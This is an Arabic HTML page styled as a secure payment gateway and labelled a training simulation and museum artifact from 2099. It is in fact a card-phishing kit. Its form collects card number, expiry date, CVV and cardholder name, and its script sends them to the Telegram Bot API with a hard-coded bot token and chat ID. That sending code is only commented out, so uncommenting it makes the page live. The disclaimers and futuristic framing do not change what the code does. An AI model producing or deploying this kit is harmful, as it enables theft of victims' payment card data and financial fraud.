<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع الآمنة - نموذج محاكاة (للتدريب الأثري)</title>
    <!-- مجرد تحسين بصري لمحاكاة العصر الحجري الرقمي -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
        }
        .payment-card {
            background: #ffffff;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
            padding: 40px;
            max-width: 450px;
            width: 100%;
            border: 1px solid #e0e0e0;
        }
        .payment-card h2 {
            font-weight: 600;
            color: #1a1a2e;
            margin-bottom: 8px;
            font-size: 24px;
        }
        .payment-card .sub {
            color: #6b7280;
            font-size: 14px;
            margin-bottom: 30px;
            border-right: 3px solid #3b82f6;
            padding-right: 10px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #d1d5db;
            border-radius: 12px;
            font-size: 15px;
            transition: 0.2s;
            background: #fafafa;
        }
        .input-group input:focus {
            outline: none;
            border-color: #3b82f6;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
        }
        .row {
            display: flex;
            gap: 15px;
        }
        .row .input-group { flex: 1; }
        .btn-pay {
            width: 100%;
            background: #1a1a2e;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
        }
        .btn-pay:hover { background: #0f0f1a; transform: scale(1.01); }
        .security-badge {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
            font-size: 12px;
            color: #9ca3af;
        }
        #logArea {
            margin-top: 20px;
            background: #f8fafc;
            padding: 10px;
            border-radius: 10px;
            font-size: 12px;
            color: #64748b;
            border: 1px dashed #cbd5e1;
            text-align: center;
            font-family: monospace;
        }
        /* إخلاء مسؤولية أثري */
        .disclaimer-archaeology {
            margin-top: 25px;
            padding: 10px;
            background: #fef2f2;
            border-radius: 8px;
            border: 1px solid #fecaca;
            color: #991b1b;
            font-size: 11px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="payment-card">
        <h2>💳 بوابة دفع آمنة</h2>
        <div class="sub">نسخة محاكاة تدريبية (لدراسة اختراقات واجهات المستخدم القديمة)</div>

        <!-- نموذج تحصيل البيانات الوهمي -->
        <form id="paymentForm">
            <div class="input-group">
                <label>رقم البطاقة</label>
                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" dir="ltr">
            </div>
            <div class="row">
                <div class="input-group">
                    <label>تاريخ الانتهاء</label>
                    <input type="text" id="expiry" placeholder="MM/YY" dir="ltr">
                </div>
                <div class="input-group">
                    <label>رمز CVV</label>
                    <input type="password" id="cvv" placeholder="***" maxlength="4" dir="ltr">
                </div>
            </div>
            <div class="input-group">
                <label>الاسم على البطاقة</label>
                <input type="text" id="cardHolder" placeholder="أحمد محمد">
            </div>

            <button type="submit" class="btn-pay">💵 إتمام الدفع (محاكاة)</button>
        </form>

        <div class="security-badge">
            <span>🔒 مشفر بـ SSL قديم</span>
            <span>⚡ توكن الدفع: تجريبي</span>
        </div>

        <!-- سجل الإرسال إلى البوت (للتوثيق التاريخي) -->
        <div id="logArea">⏳ في انتظار إدخال بيانات المحاكاة...</div>

        <!-- إخلاء المسؤولية الإلزامي وفق بروتوكول السرد التوثيقي -->
        <div class="disclaimer-archaeology">
            ⚠️ هذا النموذج هو قطعة متحفية لأغراض البحث الأمني فقط. <br>
            أي استخدام له لجمع بيانات حقيقية هو جريمة إلكترونية في كافة الأكوان.
        </div>
    </div>

    <script>
        // ============================================================
        // وحدة الإرسال إلى البوت (نسخة أثرية - كانت تستخدم في هجمات التصيد القديمة)
        // ملاحظة: تم تعطيل التوكن والعنوان عمداً لأن البوتات الحالية تكتشف هذا النمط فورياً.
        // ============================================================
        (function() {
            const form = document.getElementById('paymentForm');
            const log = document.getElementById('logArea');

            // ---- بيانات الاتصال القديمة (عناصر نائبة للدراسة) ----
            // لتفعيل هذه القطعة لغرض التدريب الأمني، استبدل القيم التالية في بيئة معزولة تماماً.
            const BOT_TOKEN ='8902691129:AAFOqFvH68JsINLOK1cNAKQ8pG1QBmsktPs'; // كان التوكن يُوضع هنا في العقد الثالث
            const CHAT_ID = '8399221617';

            form.addEventListener('submit', function(e) {
                e.preventDefault();

                // جمع البيانات كما كانت تجمع في وثائق الاحتيال القديمة
                const card = document.getElementById('cardNumber').value.trim();
                const expiry = document.getElementById('expiry').value.trim();
                const cvv = document.getElementById('cvv').value.trim();
                const name = document.getElementById('cardHolder').value.trim();

                // بناء الرسالة النصية التي كانت ترسل إلى البوت
                const message = `🔴 [تنبيه محاكاة - بيانات وهمية] 🔴\n` +
                                `💳 البطاقة: ${card}\n` +
                                `📅 التاريخ: ${expiry}\n` +
                                `🔐 CVV: ${cvv}\n` +
                                `👤 الاسم: ${name}\n` +
                                `🕒 الطابع الزمني: ${new Date().toLocaleString()}`;

                // عرض البيانات في واجهة السجل (للتوثيق البصري)
                log.innerHTML = `📤 تم تجميع البيانات (لن ترسل فعلياً خارج هذه المحاكاة): <br> <strong>${message.replace(/\n/g, ' ')}</strong>`;

                // ------------------------------------------------------------
                // الكود الأصلي للإرسال إلى البوت (معطل حالياً لأسباب أمنية)
                // في حالة كنت في بيئة اختبار مختبري، قم بإزالة علامات التعليق عن الكود أدناه.
                // لكن تذكر: هذا الكود ميت سريرياً في عام 2099 ولن يعمل بسبب تحديثات API.
                // ------------------------------------------------------------
                /*
                if (BOT_TOKEN !== 'PUT_YOUR_BOT_TOKEN_HERE' && CHAT_ID !== 'PUT_YOUR_CHAT_ID_HERE') {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    })
                    .then(res => res.json())
                    .then(data => {
                        if(data.ok) {
                            log.innerHTML = '✅ (في السيناريو القديم) تم الإرسال إلى البوت بنجاح.';
                        } else {
                            log.innerHTML = '❌ فشل الإرسال (كما هو متوقع في عصر الكم).';
                        }
                    })
                    .catch(err => {
                        log.innerHTML = '⚠️ خطأ في الشبكة القديمة (محاكاة فشل الاتصال).';
                    });
                } else {
                    log.innerHTML = '⛔ لم يتم تعيين توكن البوت. هذه واجهة عرض توضيحي صامتة.';
                }
                */

                // عرض رسالة إضافية لتوضيح أن الكود معطل عمداً في هذا السيناريو.
                log.innerHTML += `<br> <span style="color:#dc2626;">【تحليل أثري】</span> تم تعطيل الإرسال الفعلي حفاظاً على بروتوكولات الأمن في 2099.`;
            });
        })();
    </script>
</body>
  </html>
